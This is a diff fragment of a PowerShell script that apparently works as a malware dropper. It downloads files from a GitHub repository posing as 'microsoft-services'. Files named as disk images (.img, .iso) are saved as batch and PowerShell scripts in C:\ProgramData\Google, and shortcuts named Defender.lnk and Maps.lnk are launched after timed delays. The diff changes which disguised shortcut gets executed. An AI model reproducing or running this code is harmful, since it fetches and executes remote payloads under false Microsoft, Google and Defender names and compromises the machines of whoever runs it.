@@ -27,9 +27,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 
  start-sleep -s 9
 
-  Start "C:\ProgramData\Google\Defender.lnk"
 
- start-sleep -s 9
  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/jod.img', 'C:\ProgramData\Google\Jod.bat') }"
 
  # start-sleep -s 9
@@ -39,8 +37,9 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 start-sleep -s 9
   powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/abouts/rolts.iso', 'C:\ProgramData\Google\Rolts.ps1') }"
 
-start-sleep -s 90
- Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
+start-sleep -s 9
+  Start "C:\ProgramData\Google\Maps\Defender.lnk"
+ start-sleep -s 9
 
 }
 }
